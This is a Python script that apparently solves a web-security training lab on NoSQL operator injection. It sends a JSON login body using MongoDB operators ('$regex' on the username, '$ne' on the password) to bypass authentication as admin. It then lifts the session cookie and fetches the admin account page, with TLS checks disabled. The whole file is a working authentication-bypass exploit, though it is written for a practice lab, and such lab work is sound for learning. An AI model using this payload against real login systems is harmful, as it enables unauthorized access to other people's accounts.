import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting NoSQL operator injection to bypass authentication"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Injecting operators in the request body to bypass authentication and login as admin\n2. Extract session cookie from the response headers\n3. Fetch the admin profile\n""")

    print(Fore.WHITE +
          "[1] Injecting operators in the request body to bypass authentication")
    payload = """ { "username": { "$regex": "admin.*" }, "password": { "$ne": "" } } """
    headers = {"Content-Type": "application/json"}
    login_as_admin = requests.post(
        f"{url}/login", data=payload, headers=headers, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[2] Extracting session cookie of the admin")
    session = login_as_admin.cookies.get("session")
    admin_username = re.findall(
        "id=(.*)", login_as_admin.headers.get("Location"))[0]
    print(Fore.GREEN + "admin username" + Fore.WHITE +
          " => " + Fore.YELLOW + admin_username)

    cookies = {"session": session}

    try:
        r = requests.get(
            f"{url}/my-account", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        print(Fore.WHITE + "admin account fetched")
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
